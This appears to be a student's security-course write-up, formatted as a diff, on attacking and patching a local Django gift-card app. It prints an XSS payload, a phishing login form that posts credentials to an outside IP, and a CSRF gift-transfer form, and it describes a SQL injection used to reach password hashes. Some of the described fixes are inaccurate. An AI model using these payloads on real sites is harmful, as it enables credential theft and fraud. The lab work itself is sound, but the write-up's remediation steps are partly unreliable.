@@ -1,0 +1,93 @@
+Before going through the assignment i looked at all the data on the Django documentation site regarding the attacks requested in the assignment and other attacks as well. 
+
+Attack 1
+
+In the Django document talked about some words that can be used to allow vulnerability to a website in the html code. I noticed that the word safe was used in the html documents under item-single html as wlel as gift.html. After the word director it had the word safe. I found on the stackhawk website and django documentation that. "The safe filter is used mostly when data is known to be safe. But unsafe use of this filter could result in XSS vulnerabilities"
+I typed the site http://127.0.0.1:8000/buy/director=<script>alert("123")</script> produced the XSS vulnerability. 123 popped up on screen. I found the path to use from the stack hawk site example"Tony <script>alert('XSS');</script>" 
+I used XXser on my kali linux machine and inputted the site so it could produce an attack. I received the following link http://127.0.0.1:8000/buy.html?director=%3Ch3%3EPlease%20login%20to%20proceed%3C/h3%3E%20%3Cform%20action=http://192.168.149.128%3EUsername:%3Cbr%3E%3Cinput%20type=%22username%22%20name=%22username%22%3E%3C/br%3EPassword:%3Cbr%3E%3Cinput%20type=%22password%22%20name=%22password%22%3E%3C/br%3E%3Cbr%3E%3Cinput%20type=%22submit%22%20value=%22Logon%22%3E%3C/br%3E
+
+It request that users enter a log in and password and the information can be captured.
+
+to resolve the issue i removed the word safe after Director on all the html files.
+
+
+Attack 2
+
+Using CSRF i can perform the attack that allows "*One* attack that allows you to force another user to gift
+   a gift card to your account without their knowledge."  Used the burp suite to capture all the post requests which was the ip showed http://127.0.0.1:8000/gift/1. Used the following link to perform the attack XSS attack in conjunction with CSRF. 
+  http://127.0.0.1:8000/gift.html?director=<form action="http://127.0.0.1:8000/gift/0" method="POST"> <input type="hidden"
+name="amount" value="2000"/> <input type="hidden" name="username" value="slayercool"/><input type="submit" value="View
+my pictures"/> </form>
+I was resolved by using adding {% csrf_token %} after every line that had post included as well as added django.middleware.csrf.CsrfViewMiddleware to the settings.py file under middleware. 
+
+Attack 3
+
+SQL Injection some of the reasons given in the Django security documentation regarding sql injection talks about raw queries. 
+as well as the stack hawk site. "We recommend to avoid raw queries as much as they can.
+doing so, they can enjoy some of the security features already built in to the framework. But if you must use raw queries, you should ensure you do server-side validation of user inputs. 
+
+I ran Burp suite and was able to see that it had an SQL injection vunlerbaility. I also searched on the port swigger site of SQL injection attacks.
+
+"SQL injection UNION attacks
+When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack."
+"Of course, the crucial information needed to perform this attack is that there is a table called users with two columns called username and password. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains."
+
+which assisted in being able to access the admin password hash. 
+
+To fix the issue
+i was able to find the raw queries under the Legacy Site views.py.  Originally it was 
+card_query = Card.objects.filter('select id from LegacySite_card where data = \'%s\'' % signature)
+to fix the issue i need to make a changed that would remove the raw queries. 
+The edited version is card_query = Card.objects.filter(data = signature.encode())
+
+
+Attack 4
+There is an HTTPs vulnerbaility as well as part of a bug problems with an ssl/tls ran through burp suite.
+The problem can affec cookies being leaked. The attack can capture the header which will contain the user session id. It will allow the attacker to purchse things without advising the user first. Installed home brew first. Then
+brew install mkcert
+mkcert -install
+mkcert -cert-file cert.pem -key-file key.pem localhost 127.0.0.1:8000
+then installed pip install django-extensions Werkzeug
+add Django_extensions to installed apps in settings.py
+Run the server using python3 manage.py runsslserver
+
+
+
+
+
+Bug 1
+Running Burpsuite i received an error stating 
+The following cookie was issued by the application and does not have the HttpOnly flag set:
+csrftoken.
+So I looked up the fix and added SESSION_COOKIE_HTTPONLY = True to my setting.py file.
+
+Bug 2
+I got an error in Burpe Suite
+To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.
+
+This was resolved by encrypting the transport level to ssl/tls to protect all communications between server and client. 
+
+
+Bug 3
+
+In Burpe Suite i received the following error. 
+We detected bootstrap version 4.1.3, which has the following vulnerability:
+Upgraded to the latest version of bootstrap V 5.1
+
+
+Bug 4
+In Burpe Suite i received the following error. 
+We detected jquery version 3.3.1, which has the following vulnerabilities:
+upgraded to jQuery 3.5.0
+
+Bug 5
+receiving  'AnonymousUser' object is not iterable
+[29/Nov/2021 04:53:50] "POST /buy/2 HTTP/1.1" 500 112344
+Fixed it by adding from django.contrib.auth.decorators import login_required
+to setting.py file
+
+
+
+
+
+
